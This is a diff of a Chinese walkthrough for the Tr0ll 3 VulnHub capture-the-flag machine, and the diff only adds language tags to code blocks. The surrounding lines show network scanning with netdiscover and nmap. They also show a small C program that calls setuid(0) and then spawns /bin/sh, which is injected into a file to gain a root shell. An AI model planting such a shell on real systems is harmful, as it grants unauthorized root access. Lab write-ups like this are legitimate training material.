@@ -15,7 +15,7 @@ Tr0ll 3 是 vulunhub 上的一台机器。下载访问:
 
     **示例:**
 
-    ```
+    ```cpp
     netdiscover -i eth0 -r 10.0.2.0/16 
     ```
 
@@ -26,7 +26,7 @@ Tr0ll 3 是 vulunhub 上的一台机器。下载访问:
     我们得到了目标 IP。下一步是用 nmap 扫描目标。
     **例:**
 
-    ```
+    ```cpp
     nmap -p- -A -O -T 4 IP_address
     ```
 
@@ -85,7 +85,7 @@ Tr0ll 3 是 vulunhub 上的一台机器。下载访问:
 
 *   Now inject the following script into **dont_even_bother.c** file. It’s the script that will invoke a shell on executing.
 
-    ```
+    ```cpp
     int main(void) {
         setgid(0); setuid(0);
         execl("/bin/sh", "sh", 0);
